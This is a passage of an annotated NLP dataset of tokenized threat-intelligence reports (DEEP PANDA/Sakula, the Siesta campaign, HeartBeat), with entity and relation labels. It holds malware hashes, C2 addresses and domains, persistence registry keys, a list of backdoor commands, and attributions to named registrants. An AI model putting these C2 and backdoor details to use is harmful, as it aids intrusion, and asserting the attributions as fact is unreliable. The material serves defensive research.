"spoof", "that", "of", "a", "site", "set"], ["up", "to", "provide", "information", "on", "an", "alumni", "event", "for", "a", "U", ".", "S", "university", ".", "This", "page", "requested", "that", "the"], ["visitor", "download", "an", "Adobe-related", "plugin", "in", "order", "to", "view", "the", "content", ".", "The", "downloaded", "plugin", "\ufb01le"], ["included", "a", "variant", "of", "Sakula", "malware", ".", "[1]"], ["The", "Sakula", "malware", "in", "this", "campaign", "utilized", "the", "Dynamic", "Link", "Library", "(DLL)", "side-loading"], ["technique", "most", "commonly", "associated", "with", "PlugX", "activity", ".", "In", "the", "aforementioned", "universityrelated", "incidents", ",", "a", "legitimate", "executable", "named", "MediaSoft", ".", "exe", "(MD5", "hash:"], ["d00b3169f45e74bb22a1cd684341b14a)", "loaded", "a", "\ufb01le", "named", "msi", ".", "dll", "(MD5", "hash:"], ["ae6f33f6cdc25dc4bda24b2bccff79fe)", ",", "which", ",", "in", "turn", ",", "was", "used", "to", "load", "the", "Sakula", "executable"], ["(MD5", "hash:", "0c2674c3a97c53082187d930efb645c2)", ".", "This", "\ufb01nal", "executable", "was", "also", "signed", "with", "a"], ["certi\ufb01cate", "assigned", "to", "an", "organization", "called", "DTOPTOOLZ", "Co", ".", ",", "Ltd", "."], ["Command-and-Control", "(C2)", "communications", "in", "this", "incident", "went", "directly", "to", "IP", "address"], ["180", ".", "210.206.246;", "a", "sample", "GET", "request", "is", "below:"], ["Further", "investigation", "revealed", "similar", "activity", "stretching", "back", "to", "at", "least", "April", "2014", ",", "when", "similar"], ["TTPs", "were", "used", "to", "target", "a", "healthcare", "organization", "and", "a", "U", ".", "S.-based", "IT", "company", "with", "highpro\ufb01le", "clients", "in", "the", "defense", "sector", ".", "Two", "other", "incidents", "were", "also", "identi\ufb01ed", "in", "August", "2014"], ["targeting", "a", "company", "in", "the", "DIB", "and", "a", "Mongolian", "government", "entity", "."], ["All", "incidents", "in", "this", "campaign", "were", "similar", "in", "that", "they", "utilized", "malicious", "droppers", "masquerading"], ["as", "installers", "for", "legitimate", "software", "applications", "like", "Adobe", "Reader", ",", "Juniper", "VPN", ",", "and", "Microsoft"], ["ActiveX", "Control", ".", "They", "display", "progress", "bars", "that", "make", "it", "appear", "as", "if", "the", "speci\ufb01ed", "software", "is"], ["being", "updated", "or", "installed", "."], ["Example", "of", "Installer", "Progress", "Bar", "Displayed", "by", "Dropper"], ["In", "addition", ",", "the", "droppers", "all", "directed", "victims", "to", "login", "pages", "for", "services", "speci\ufb01c", "to", "the", "target"], ["organization", "like", "webmail", ",", "document", "sharing", ",", "or", "corporate", "VPN", ".", "In", "all", "cases", "except", "one", ",", "the"], ["victims", "were", "directed", "to", "legitimate", "login", "pages", ".", "The", "one", "exception", "was", "a", "case", "in", "which", "victims"], ["were", "sent", "to", "a", "login", "page", "hosted", "on", "a", "domain", "that", "spoofed", "that", "of", "the", "legitimate", "one", ".", "It", "is", "unclear"], ["whether", "redirecting", "victims", "to", "these", "login", "pages", "was", "part", "of", "credential-collection", "activity", "or", "merely"], ["meant", "to", "deceive", "victims", "into", "believing", "that", "the", "activity", "was", "legitimate", "."], ["Example", "of", "a", "Login", "Page", "that", "Victims", "were", "Redirected", "to"], ["The", "campaign", "appeared", "to", "be", "over", "by", "the", "end", "of", "August", ",", "but", "a", "\ufb01le", "was", "recently", "discovered", "that"], ["suggests", "it", "may", "be", "ongoing", ".", "The", "intended", "target", "again", "appeared", "to", "be", "a", "Mongolian", "government"], ["entity", ",", "and", "the", "\ufb01le", "masqueraded", "as", "an", "installer", "for", "Microsoft", "ActiveX", "software", ".", "It", "dropped", "the"], ["side-loaded", "Sakula", "malware", "just", "like", "in", "the", "other", "incidents;", "however", ",", "in", "this", "instance", ",", "the", "Sakula"], ["payload", "was", "signed", "with", "a", "certi\ufb01cate", "assigned", "to", "a", "different", "organization", ",", "Career", "Credit", "Co", ".", ",", "Ltd", "."], ["The", "malware", "used", "the", "domain", "www[", ".", "]xha-mster[.]com", "for", "C2", "which", "was", "created", "in", "midSeptember", "and", "is", "registered", "with", "the", "email", "address", "wendellom@yahoo", ".", "com", "and", "registrant", "name"], ["\u201ctonyy", "starke\u201d", "(hence", "the", "name", ",", "Ironman-related", "title", "for", "this", "blog)", "."], ["Below", "is", "a", "chart", "showing", "the", "relevant", "relationships", "to", "this", "DEEP", "PANDA", "campaign", "."], ["The", "bottom", "of", "the", "chart", "shows", "an", "infrastructure", "connection", "between", "an", "IP", "address"], ["(198", ".", "200.45.112)", "used", "this", "campaign", "and", "also", "used", "in", "recently", "observed", "DEEP", "PANDA", "activity", "."], ["Association", "with", "Recent", "Scanbox", "Activity"], ["In", "September", "2014", ",", "CrowdStrike", "Intelligence", "identi\ufb01ed", "a", "malicious", "\ufb01le", "signed", "with", "the"], ["DTOPTOOLZ", "Co", ".", ",", "Ltd", ".", "certi\ufb01cate", ".", "Analysis", "of", "this", "\ufb01le", "revealed", "it", "to", "be", "Derusbi", "malware", "(a", "favorite"], ["RAT", "of", "DEEP", "PANDA)", "that", "used", "the", "domain", "vpn[", ".", "]foundationssl[.]com", "for", "its", "C2", ".", "At", "the", "time", "of"], ["discovery", ",", "CrowdStrike", "did", "not", "attribute", "the", "\ufb01le", "to", "DEEP", "PANDA", "based", "on", "the", "malware", "alone", ","], ["but", "the", "use", "of", "the", "DTOPTOOLZ", "certi\ufb01cate", "to", "sign", "a", "malware", "variant", "known", "to", "be", "heavily", "used", "by"], ["this", "adversary", "makes", "it", "likely", "that", "this", "signed", "Derusbi", "sample", "is", "also", "attributable", "to", "DEEP"], ["PANDA", "."], ["In", "a", "recent", "public", "report", "from", "PWC", ",", "another", "foundationssl[", ".", "]com", "domain", "was", "linked", "to", "activity"], ["involving", "the", "Strategic", "Web", "Compromise", "(SWC)", "framework", "more", "commonly", "known", "as"], ["Scanbox", ".", "In", "that", "operation", ",", "the", "Scanbox", "code", "was", "placed", "on", "the", "website", "of", "a", "U", ".", "S.-based", "think"], ["tank", "and", "utilized", "the", "malicious", "domain", ",", "news[", ".", "]foundationssl[.]com.", "The", "use", "of", "the", "two"], ["foundationssl[", ".", "]com", "subdomains", "suggests", "that", "the", "same", "adversary", "(in", "this", "case", "DEEP", "PANDA)"], ["was", "responsible", "for", "the", "signed", "Derusbi", "malware", "\ufb01le", "and", "the", "think", "tank", "SWC", "activity", "."], ["Furthermore", ",", "CrowdStrike", "publicly", "reported", "on", "DEEP", "PANDA", "targeting", "of", "think", "tanks", "in", "July"], ["2014", "."], ["If", "you", "want", "to", "hear", "more", "about", "DEEP", "PANDA", "and", "their", "tradecraft", "or", "any", "of", "the", "other", "adversaries"], ["that", "CrowdStrike", "tracks", ",", "please", "contact:", "sales@crowdstrike", ".", "com"], ["[1]", "In", "February", "2014", ",", "CrowdStrike", "publicly", "reported", "on", "a", "campaign", "that", "leveraged", "Sakula"], ["malware", "(http://www", ".", "crowdstrike.com/blog/french-connection-french-aerospace-focused-cve-"], ["2014-0322-attack-shares-similarities-2012/index", ".", "html);", "however", ",", "the", "Tactics", ",", "Techniques", ",", "and"], ["Procedures", "(TTPs)", "between", "that", "campaign", "and", "this", "recent", "one", "are", "different", ",", "suggesting", "two"], ["distinct", "adversaries", "are", "using", "the", "Sakula", "malware", "."], ["5"], ["40"], ["\u2190", "December", "CrowdCast:", "Rockin\u2019", "Around"], ["Your", "Unsecured", "Network"], ["Cloud-Based", "Security:", "The", "Next"], ["Generation", "of", "Defense", "for", "the", "Good", "Guys"], ["\u2192"], ["Follow", "Us"], ["Tweets", "about", "\"from:crowdstrike", "OR", "from:Adam_Cyber", "OR", "from:JMDeC", "OR", "from:DmitriCyber", "OR"], ["from:StevenChabinsky", "OR", "from:George_Kurtz\""], ["Recent", "Posts"], ["The", "Imperative", "for", "Proactive", "Incident", "Response", "in", "2015", "and", "Beyond"], ["November", "3", ",", "2015"], ["Why", "Your", "Business", "Environment", "Should", "Drive", "Cybersecurity"], ["November", "2", ",", "2015"], ["Blurring", "of", "Commodity", "and", "Targeted", "Attack", "Malware"], ["October", "16", ",", "2015"], ["Should", "I", "Really", "Trust", "the", "Cloud", "with", "my", "Endpoint", "Protection", "?"], ["September", "30", ",", "2015"], ["U", ".", "S.", "\u2013", "China", "Agreement", "on", "Cyber", "Intrusions:", "An", "In\ufb02ection", "Point"], ["September", "25", ",", "2015"], ["Archives"], ["N"], ["M"], ["T"], ["W"], ["O"], ["V"], ["T"], ["E"], ["M"], ["B"], ["E"], ["F"], ["R"], ["2"], ["S"], ["0"], ["1"], ["5"], ["S"], ["1"], ["2"], ["3"], ["4"], ["5"], ["6"], ["7"], ["8"], ["9"], ["10"], ["11"], ["12"], ["13"], ["14"], ["15"], ["16"], ["17"], ["18"], ["19"], ["20"], ["21"], ["22"], ["23"], ["24"], ["25"], ["26"], ["27"], ["28"], ["29"], ["30"], ["\u00ab", "Oct"], ["Recent", "Comments"]]}], [{"vertexSet": [{"old_id": "T1", "type": "Campaign", "name": "Safe", "sent_id": 2, "pos": [10]}, {"old_id": "T2", "type": "Campaign", "name": "Siesta", "sent_id": 0, "pos": [1]}, {"old_id": "T3", "type": "Campaign", "name": "Siesta", "sent_id": 4, "pos": [1]}, {"old_id": "T4", "type": "Campaign", "name": "Siesta", "sent_id": 17, "pos": [1]}, {"old_id": "T5", "type": "ExploitTargetObject0", "name": "undisclosed company", "sent_id": 19, "pos": [5, 6]}, {"old_id": "T7", "type": "Exploit", "name": "spear-phishing emails", "sent_id": 18, "pos": [11, 12]}, {"old_id": "T8", "type": "File", "name": "http://{malicious domain}/{organization name}/{legitimate archive name}zip", "sent_id": 24, "pos": []}, {"old_id": "T9", "type": "Dropper", "name": "TROJ_SLOTH", "sent_id": 25, "pos": []}, {"old_id": "T10", "type": "Payload", "name": "google{BLOCKED}exe", "sent_id": 29, "pos": []}, {"old_id": "T11", "type": "Indicator", "name": "http://wwwmicro{BLOCKED} com/indexhtml", "sent_id": 31, "pos": []}, {"old_id": "T12", "type": "Malware", "name": "BKDR_SLOTHB", "sent_id": 32, "pos": []}, {"old_id": "T13", "type": "SHA-1", "name": "014542eafb792b98196954373b3fd13e60cb94fe", "sent_id": 47, "pos": []}, {"old_id": "T14", "type": "Dropper", "name": "Questionaire Concerning the Spread of Superbugs February 2014exe", "sent_id": 46, "pos": []}, {"old_id": "T15", "type": "Payload", "name": "UIODsevrexe", "sent_id": 48, "pos": []}, {"old_id": "T16", "type": "Malware", "name": "BKDR_SLOTHB", "sent_id": 48, "pos": []}, {"old_id": "T17", "type": "Indicator", "name": "skys{BLOCKED}com", "sent_id": 49, "pos": [5]}, {"old_id": "T18", "type": "Malware", "name": "BKDR_SLOTHA", "sent_id": 50, "pos": []}, {"old_id": "T19", "type": "Campaign", "name": "Siesta", "sent_id": 52, "pos": []}, {"old_id": "T20", "type": "Indicator", "name": "sky{BLOCKED}com", "sent_id": 74, "pos": []}, {"old_id": "T21", "type": "Indicator", "name": "micro{BLOCKED}com", "sent_id": 75, "pos": []}, {"old_id": "T22", "type": "Indicator", "name": "ifued{BLOCKED}net", "sent_id": 75, "pos": []}, {"old_id": "T23", "type": "Attacker", "name": "Li Ning", "sent_id": 75, "pos": [12, 13]}, {"old_id": "T24", "type": "Email", "name": "xiaomao{BLOCKED}@163com", "sent_id": 76, "pos": []}], "labels": [{"old_id": "R1", "r": "P27", "h": 3, "t": 4, "evidence": [17, 18, 19]}, {"old_id": "R2", "r": "P22", "h": 3, "t": 5, "evidence": [17, 18]}, {"old_id": "R3", "r": "P21", "h": 6, "t": 7, "evidence": [24, 25]}, {"old_id": "R4", "r": "P13", "h": 7, "t": 8, "evidence": [25, 26, 27, 28, 29]}, {"old_id": "R5", "r": "P21", "h": 9, "t": 7, "evidence": []}, {"old_id": "R6", "r": "P22", "h": 3, "t": 7, "evidence": [17, 18, 19, 20, 21, 22, 23, 24, 25]}, {"old_id": "R7", "r": "P21", "h": 9, "t": 10, "evidence": [31, 32]}, {"old_id": "R8", "r": "P23", "h": 3, "t": 10, "evidence": [17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32]}, {"old_id": "R9", "r": "P21", "h": 11, "t": 12, "evidence": []}, {"old_id": "R10", "r": "P13", "h": 12, "t": 13, "evidence": [46, 47, 48]}, {"old_id": "R11", "r": "P21", "h": 15, "t": 12, "evidence": []}, {"old_id": "R12", "r": "P13", "h": 16, "t": 13, "evidence": []}, {"old_id": "R13", "r": "P21", "h": 11, "t": 16, "evidence": [47, 48, 49, 50]}, {"old_id": "R14", "r": "P21", "h": 15, "t": 16, "evidence": [49, 50]}, {"old_id": "R15", "r": "P22", "h": 17, "t": 16, "evidence": []}, {"old_id": "R16", "r": "P22", "h": 17, "t": 14, "evidence": []}, {"old_id": "R17", "r": "P2", "h": 21, "t": 10, "evidence": []}], "title": ["inputs/txt/201403TrendMicroSiesta"], "sents": [["The", "Siesta", "Campaign:", "A", "New", "Cybercrime", "Operation", "Awakens"], ["In", "the", "past", "few", "weeks", ",", "we", "have", "received", "several", "reports", "of", "targeted", "attacks", "that", "exploited", "various"], ["application", "vulnerabilities", "to", "infiltrate", "various", "organizations", ".", "Similar", "to", "the", "Safe", "Campaign", ",", "the", "campaigns"], ["we", "noted", "went", "seemingly", "unnoticed", "and", "under", "the", "radar", ".", "The", "attackers", "orchestrating", "the", "campaign", "we", "call"], ["the", "Siesta", "Campaign", "used", "multicomponent", "malware", "to", "target", "certain", "institutions", "that", "fall", "under", "the"], ["following", "industries:"], ["Consumer", "goods", "and", "services"], ["Energy"], ["Finance"], ["Healthcare"], ["Media", "and", "telecommunications"], ["Public", "administration"], ["Security", "and", "defense"], ["Transport", "and", "traffic"], ["Threat", "actors", "don\u2019t", "always", "rely", "on", "complex", "attack", "vectors", "to", "infiltrate", "an", "organization\u2019s", "network", ".", "Attackers"], ["can", "also", "make", "use", "of", "basic", "social", "engineering", "techniques", "for", "their", "victims", "to", "take", "the", "bait", ",", "such", "as", "in", "our"], ["case", "study", "below", "."], ["The", "Siesta", "Campaign:", "A", "Case", "Study"], ["We", "are", "currently", "investigating", "an", "incident", "that", "involved", "attackers", "sending", "out", "spear-phishing", "emails"], ["addressed", "to", "executives", "of", "an", "undisclosed", "company", ".", "These", "emails", "were", "sent", "from", "spoofed", "email", "addresses"], ["of", "personnel", "within", "the", "organization", ".", "Instead", "of", "using", "attachments", "and", "document", "exploits", ",", "this", "specific"], ["campaign", "served", "their", "malware", "through", "a", "legitimate-looking", "file", "download", "link", "."], ["To", "lure", "the", "target", "into", "downloading", "the", "file", ",", "the", "attacker", "serves", "the", "archive", "under", "a", "URL", "path", "named", "after"], ["the", "target", "organization\u2019s", "name", "as", "cited", "below:"], ["http://{malicious", "domain}/{organization", "name}/{legitimate", "archive", "name}", ".", "zip"], ["This", "archive", "contains", "an", "executable", "(TROJ_SLOTH)", "disguised", "as", "a", "PDF", "document", ".", "When", "executed", ",", "it"], ["drops", "and", "opens", "a", "valid", "PDF", "file", ",", "which", "was", "most", "probably", "taken", "from", "the", "target", "organization\u2019s", "website", "."], ["Along", "with", "this", "valid", "PDF", "file", ",", "another", "malicious", "component", "is", "also", "dropped", "and", "executed", "in", "the"], ["background", "."], ["This", "backdoor", "component", "is", "named", "google{BLOCKED}", ".", "exe.", "(Due", "to", "the", "ongoing", "investigation", ",", "we", "are"], ["unfortunately", "unable", "to", "share", "hashes", "and", "filenames", "at", "this", "time", ".", ")", "This", "backdoor", "connects", "to"], ["http://www", ".", "micro{BLOCKED}.", "com/index", ".", "html,", "which", "are", "its", "command-and-control", "(C&C)", "servers", "."], ["Trend", "Micro", "identifies", "these", "samples", "as", "BKDR_SLOTH", ".", "B."], ["At", "this", "point", ",", "the", "malware", "begins", "waiting", "for", "additional", "commands", "from", "the", "attacker", ".", "The", "encrypted"], ["commands", "that", "are", "accepted", "are:"], ["Sleep:"], ["Commands", "the", "backdoor", "to", "sleep", "for", "specified", "number", "of", "minutes"], ["We", "have", "received", "a", "sleep", "command", "of", "\u201csleep:120\u201d", "during", "our", "analysis", "which", "means", "that", "the"], ["malware", "will", "wait", "for", "2hrs", "before", "establishing", "a", "connection", "again", "to", "the", "C&C", "server"], ["Download:", "<download_url>"], ["Commands", "the", "backdoor", "to", "download", "and", "execute", "a", "file", "(most", "probably", "another", "Win32"], ["executable)", "from", "a", "specified", "URL"], ["The", "C&C", "servers", "used", "in", "this", "campaign", "are", "found", "to", "be", "newly", "registered", "and", "also", "short-lived", ",", "making", "it"], ["difficult", "for", "us", "to", "track", "the", "malware\u2019s", "behavior", "."], ["Based", "on", "our", "research", ",", "we", "found", "2", "variants", "of", "the", "malware", "used", "in", "this", "campaign", ".", "Although", "not", "exactly"], ["alike", ",", "the", "behaviors", "are", "nearly", "identical", "."], ["One", "of", "the", "similar", "samples", "is", "a", "file", "named", "Questionaire", "Concerning", "the", "Spread", "of", "Superbugs", "February"], ["2014", ".", "exe", "(SHA1:", "014542eafb792b98196954373b3fd13e60cb94fe)", ".", "This", "sample", "drops", "the", "file"], ["UIODsevr", ".", "exe,", "its", "backdoor", "component", "which", "behaves", "similarly", "as", "BKDR_SLOTH", ".", "B", "with", "the", "addition", "of"], ["communicating", "to", "its", "C&C", "at", "skys{BLOCKED}com", ".", "These", "samples", "are", "identified", "by", "Trend", "Micro", "as"], ["BKDR_SLOTH", ".", "A."], ["Both", "variants", "excessively", "use", "Sleep", "calls", ",", "which", "renders", "the", "malware", "dormant", "for", "varying", "periods", "of", "time", ","], ["hence", "the", "campaign", "name", "\u201cSiesta\u201d", "(which", "means", "to", "take", "a", "short", "nap", "in", "Spanish)", ".", "Commands", "are", "being"], ["served", "through", "HTML", "pages", "using", "different", "keywords", "as", "listed", "below:"], ["Variant", "1"], ["prefix:", "\u201c>SC<\u201d"], ["Variant", "2"], ["prefix:", "\u201clongDesc=\u201d"], ["suffix:", "\u201c", ".", "txt\u201d"], ["Listed", "below", "are", "the", "backdoor", "commands", "we", "were", "able", "to", "see", "from", "our", "analysis:"], ["Variant", "1"], ["\u201crun1\u201d", "\u2013", "open", "a", "remote", "shell"], ["\u201crun2\u201d", "\u2013", "pipe", "shell", "commands", "from", "URL1"], ["\u201crun3\u201d", "\u2013", "pipe", "shell", "commands", "from", "URL2"], ["\u201chttp\u201d", "\u2013", "pipe", "shell", "commands", "from", "C2"], ["\u201cx_\u201d", "\u2013", "sleep", "for", "specified", "number", "of", "minutes"], ["Variant", "2"], ["\u201csleep:\u201d", "\u2013", "sleep", "for", "specified", "number", "of", "minutes"], ["\u201cdownload:\u201d", "\u2013", "download", "and", "execute", "another", "executable", "from", "C2"], ["Attribution"], ["Attribution", "of", "campaigns", "and", "attack", "methods", "can", "often", "be", "difficult", ".", "We", "were", "able", "to", "identify", "this", "new"], ["campaign", "through", "inspecting", "hashes", ",", "C&Cs", ",", "registrants", ",", "commands", ",", "and", "additional", "information", "."], ["Figure", "1", ".", "Attribution", "Graph", "(click", "the", "thumbnail", "for", "full", "view)"], ["During", "the", "course", "of", "our", "investigation", "into", "this", "new", "campaign", ",", "we", "investigated", "the", "malware", "dropped", ".", "We"], ["quickly", "noticed", "the", "registrant", "of", "sky{BLOCKED}", ".", "com", "is", "also", "the", "same", "registrant", "as"], ["micro{BLOCKED}", ".", "com", "and", "ifued{BLOCKED}", ".", "net.", "This", "individual", "used", "the", "name", "Li", "Ning", "and", "others", "with"], ["an", "email", "address", "of", "xiaomao{BLOCKED}@163", ".", "com.", "This", "individual", "also", "recently", "registered", "79", "additional"], ["domains", ".", "There", "are", "a", "total", "of", "roughly", "17", ",", "000", "domains", "registered", "with", "this", "same", "email", "address", "."], ["Figure", "2", ".", "Domains", "registered", "under", "the", "name", "Li", "Ning", ",", "based", "on", "Whois", "data"], ["Conclusion"], ["Early", "detection", "is", "crucial", "in", "preventing", "targeted", "attacks", "from", "exfiltrating", "confidential", "company", "data", "."], ["Organizations", "and", "large", "enterprises", "need", "an", "advanced", "threat", "protection", "platform", "like", "Trend", "Micro\u2122", "Deep"], ["Discovery", ",", "which", "can", "mitigate", "the", "risks", "posed", "by", "targeted", "attacks", "through", "its", "various", "security", "technologies"], ["and", "global", "threat", "intelligence", ".", "At", "the", "heart", "of", "our", "Custom", "Defense", "solution", "is", "Deep", "Discovery", "which"], ["provides", "real-time", "local", "and", "global", "intelligence", "across", "the", "attack", "life", "cycle", ".", "This", "can", "help", "IT", "administrators"], ["understand", "the", "nature", "of", "the", "attack", "they", "are", "dealing", "with", "."], ["Trend", "Micro", "blocks", "all", "related", "threats", ",", "emails", "and", "URLs", "associated", "with", "these", "attacks", ".", "As", "always", ",", "we"], ["advise", "users", "to", "exercise", "caution", "when", "opening", "emails", "and", "links", "."], ["With", "additional", "insights", "and", "analysis", "from", "Kervin", "Alintanahin", ",", "Dove", "Chiu", ",", "and", "Kyle", "Wilhoit", "."]]}], [{"vertexSet": [{"old_id": "T1", "type": "Campaign", "name": "HeartBeat", "sent_id": 28, "pos": []}, {"old_id": "T2", "type": "Time", "name": "2009", "sent_id": 30, "pos": [5]}, {"old_id": "T3", "type": "Malware", "name": "remote administration tool", "sent_id": 42, "pos": [3, 5]}, {"old_id": "T4", "type": "Campaign", "name": "HeartBeat", "sent_id": 39, "pos": [7]}, {"old_id": "T5", "type": "Campaign", "name": "Luckycat", "sent_id": 52, "pos": [6]}, {"old_id": "T6", "type": "Country", "name": "India", "sent_id": 54, "pos": [3]}, {"old_id": "T7", "type": "Country", "name": "Japan", "sent_id": 54, "pos": [5]}, {"old_id": "T8", "type": "ExploitTargetObject", "name": "Tibetan activists\u2019 community", "sent_id": 55, "pos": [3, 5]}, {"old_id": "T9", "type": "ExploitTargetObject", "name": "aerospace energy engineering shipping and military research industries", "sent_id": 53, "pos": []}, {"old_id": "T10", "type": "Campaign", "name": "IXESHE", "sent_id": 56, "pos": [0]}, {"old_id": "T11", "type": "ExploitTargetObject", "name": "East Asian governments", "sent_id": 56, "pos": []}, {"old_id": "T12", "type": "ExploitTargetObject", "name": "Taiwanese electronics manufacturers", "sent_id": 57, "pos": [2, 4]}, {"old_id": "T13", "type": "ExploitTargetObject", "name": "telecommunications company", "sent_id": 58, "pos": [2, 3]}, {"old_id": "T14", "type": "Campaign", "name": "Taidoor", "sent_id": 61, "pos": [4]}, {"old_id": "T15", "type": "Country", "name": "Taiwan", "sent_id": 63, "pos": [0]}, {"old_id": "T16", "type": "Country", "name": "South Korea", "sent_id": 66, "pos": []}, {"old_id": "T17", "type": "Campaign", "name": "HeartBeat", "sent_id": 67, "pos": []}, {"old_id": "T18", "type": "Campaign", "name": "HeartBeat", "sent_id": 77, "pos": [1]}, {"old_id": "T19", "type": "Time", "name": "June 2012", "sent_id": 82, "pos": [4, 5]}, {"old_id": "T20", "type": "Time", "name": "November 2009", "sent_id": 87, "pos": [5, 6]}, {"old_id": "T21", "type": "ExploitTargetObject", "name": "Political parties", "sent_id": 90, "pos": [1, 2]}, {"old_id": "T22", "type": "ExploitTargetObject", "name": "Media outfits", "sent_id": 91, "pos": [1, 2]}, {"old_id": "T23", "type": "ExploitTargetObject", "name": "A national policy research institute", "sent_id": 92, "pos": [1, 5]}, {"old_id": "T24", "type": "ExploitTargetObject", "name": "A military branch of South Korean armed forces", "sent_id": 93, "pos": [1, 8]}, {"old_id": "T25", "type": "Campaign", "name": "HeartBeat", "sent_id": 94, "pos": [4]}, {"old_id": "T27", "type": "Campaign", "name": "HeartBeat", "sent_id": 116, "pos": [4]}, {"old_id": "T26", "type": "Email", "name": "spearphishing emails", "sent_id": 122, "pos": []}, {"old_id": "T28", "type": "Software", "name": "Smart Protection Network", "sent_id": 154, "pos": []}, {"old_id": "T29", "type": "Organization", "name": "Trend Micro", "sent_id": 154, "pos": []}, {"old_id": "T30", "type": "File", "name": "%Program Files%\\Common Files\\Services\\6to4ntdll", "sent_id": 182, "pos": []}, {"old_id": "T31", "type": "File", "name": "%Program Files%\\Common Files\\System\\6to4ntdll", "sent_id": 183, "pos": []}, {"old_id": "T32", "type": "File", "name": "%Program Files%\\Windows NT\\Accessories\\6to4ntdll", "sent_id": 184, "pos": []}, {"old_id": "T33", "type": "File", "name": "%Program Files%\\Windows NT\\htrndll", "sent_id": 185, "pos": []}, {"old_id": "T34", "type": "File", "name": "%Program Files%\\Windows NT\\htrn_jlsdll", "sent_id": 186, "pos": []}, {"old_id": "T35", "type": "File", "name": "%Program Files%\\Windows NT\\hyperdll", "sent_id": 187, "pos": []}, {"old_id": "T36", "type": "File", "name": "%System%\\Network Remotedll", "sent_id": 188, "pos": []}, {"old_id": "T37", "type": "File", "name": "%System%\\SvcHostdll", "sent_id": 189, "pos": []}, {"old_id": "T38", "type": "Malware", "name": "RAT", "sent_id": 178, "pos": [1]}, {"old_id": "T39", "type": "File", "name": "%System%\\msrtexe", "sent_id": 206, "pos": []}, {"old_id": "T40", "type": "File", "name": "%Program Files%\\Common Files\\AcroRd32exe", "sent_id": 207, "pos": []}, {"old_id": "T41", "type": "File", "name": "%Program Files%\\Common Files\\configexe", "sent_id": 208, "pos": []}, {"old_id": "T42", "type": "Malware", "name": "RAT", "sent_id": 204, "pos": [1]}, {"old_id": "T43", "type": "Indicator", "name": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\ Services\\{service name} Type = \u201c20\u201d Start = \u201c2\u201d ErrorControl = \u201c1\u201d ImagePath = \u201c%SystemRoot%\\System32\\svchostexe -k netsvcs\u201d ObjectName = \u201cLocalSystem\u201d", "sent_id": 217, "pos": []}, {"old_id": "T44", "type": "Indicator", "name": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\ Services\\{service name}\\Parameters ServiceDll = C:\\Program Files\\Windows NT\\htrn dll", "sent_id": 225, "pos": []}, {"old_id": "T45", "type": "Indicator", "name": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\ Services\\{service name}\\Security Security = {values}", "sent_id": 229, "pos": []}, {"old_id": "T46", "type": "Indicator", "name": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\ Services\\{service name}\\Enum 0 = \u201cRoot\\LEGACY_{service name}\\0000\u201d Count = \u201c1\u201d NextInstance = \u201c1\u201d *{service name} may be \u201c6to4\u201d \u201cIas\u201d or \u201cIrmon\u201d", "sent_id": 232, "pos": []}, {"old_id": "T47", "type": "Indicator", "name": "qawsed", "sent_id": 248, "pos": []}, {"old_id": "T48", "type": "Indicator", "name": "army-1022", "sent_id": 303, "pos": []}, {"old_id": "T49", "type": "Malware", "name": "HeartBeat", "sent_id": 296, "pos": [0]}, {"old_id": "T50", "type": "Country", "name": "Armenia", "sent_id": 308, "pos": [4]}, {"old_id": "T51", "type": "Country", "name": "USA", "sent_id": 308, "pos": [6]}, {"old_id": "T52", "type": "Country", "name": "Japan", "sent_id": 308, "pos": [8]}, {"old_id": "T53", "type": "Country", "name": "India", "sent_id": 308, "pos": [10]}, {"old_id": "T54", "type": "Country", "name": "Korea", "sent_id": 309, "pos": [0]}, {"old_id": "T55", "type": "Campaign", "name": "HeartBeat", "sent_id": 306, "pos": [1]}], "labels": [{"old_id": "R1", "r": "P33", "h": 0, "t": 1, "evidence": [28, 29, 30]}, {"old_id": "R2", "r": "P22", "h": 3, "t": 2, "evidence": [39, 40, 41, 42]}, {"old_id": "R3", "r": "P32", "h": 4, "t": 5, "evidence": [52, 53, 54]}, {"old_id": "R4", "r": "P32", "h": 4, "t": 6, "evidence": [52, 53, 54]}, {"old_id": "R5", "r": "P27", "h": 4, "t": 7, "evidence": [52, 53, 54, 55]}, {"old_id": "R6", "r": "P27", "h": 4, "t": 8, "evidence": [52, 53]}, {"old_id": "R7", "r": "P27", "h": 9, "t": 10, "evidence": [56]}, {"old_id": "R8", "r": "P27", "h": 9, "t": 11, "evidence": [56, 57]}, {"old_id": "R9", "r": "P27", "h": 9, "t": 12, "evidence": [56, 57, 58]}, {"old_id": "R10", "r": "P32", "h": 13, "t": 14, "evidence": [61, 62, 63]}, {"old_id": "R11", "r": "P32", "h": 16, "t": 15, "evidence": []}, {"old_id": "R12", "r": "P33", "h": 17, "t": 18, "evidence": [77, 78, 79, 80, 81, 82]}, {"old_id": "R13", "r": "P33", "h": 17, "t": 19, "evidence": [77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87]}, {"old_id": "R14", "r": "P27", "h": 24, "t": 20, "evidence": []}, {"old_id": "R15", "r": "P27", "h": 24, "t": 21, "evidence": []}, {"old_id": "R16", "r": "P27", "h": 24, "t": 22, "evidence": []}, {"old_id": "R17", "r": "P27", "h": 24, "t": 23, "evidence": []}, {"old_id": "R18", "r": "P17", "h": 28, "t": 27, "evidence": [154]}, {"old_id": "R19", "r": "P21", "h": 29, "t": 37, "evidence": []}, {"old_id": "R20", "r": "P21", "h": 30, "t": 37, "evidence": []}, {"old_id": "R21", "r": "P21", "h": 31, "t": 37, "evidence": []}, {"old_id": "R22", "r": "P21", "h": 32, "t": 37, "evidence": []}, {"old_id": "R23", "r": "P21", "h": 33, "t": 37, "evidence": []}, {"old_id": "R24", "r": "P21", "h": 34, "t": 37, "evidence": []}, {"old_id": "R25", "r": "P21", "h": 35, "t": 37, "evidence": []}, {"old_id": "R26", "r": "P21", "h": 36, "t": 37, "evidence": []}, {"old_id": "R27", "r": "P21", "h": 38, "t": 41, "evidence": []}, {"old_id": "R28", "r": "P21", "h": 39, "t": 41, "evidence": []}, {"old_id": "R29", "r": "P21", "h": 40, "t": 41, "evidence": []}, {"old_id": "R30", "r": "P21", "h": 47, "t": 48, "evidence": []}, {"old_id": "R31", "r": "P32", "h": 54, "t": 49, "evidence": [306, 307, 308]}, {"old_id": "R32", "r": "P32", "h": 54, "t": 50, "evidence": [306, 307, 308]}, {"old_id": 